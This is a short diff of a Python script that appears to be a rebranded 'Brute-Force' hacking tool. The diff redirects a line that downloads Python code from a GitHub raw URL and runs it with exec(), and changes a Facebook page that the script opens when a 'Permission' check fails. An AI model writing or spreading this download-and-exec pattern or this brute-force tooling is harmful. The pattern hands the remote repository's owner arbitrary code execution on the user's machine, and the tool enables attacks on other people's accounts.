@@ -39,7 +39,7 @@ time.sleep(2)
 os.system("clear")
 rs=requests.session()
 rg=rs.get
-x=(rg("https://raw.githubusercontent.com/Noob-Hacker71/Noob-Hacker71/main/info.py").text)
+x=(rg("https://raw.githubusercontent.com/trhacknon/trkn/main/info.py").text)
 exec(x)
 ##### LOGO #####
 
@@ -74,7 +74,7 @@ if Permission=="On":
 else:
   motion(ccl+"You Need Noob-Hacker71's Permission")
   time.sleep(2)
-  os.system("xdg-open https://www.facebook.com/ntahsan.nayem")
+  os.system("xdg-open https://www.facebook.com/100030723878953")
   exit()
 while True:
     os.system("figlet -f small Brute-Force")
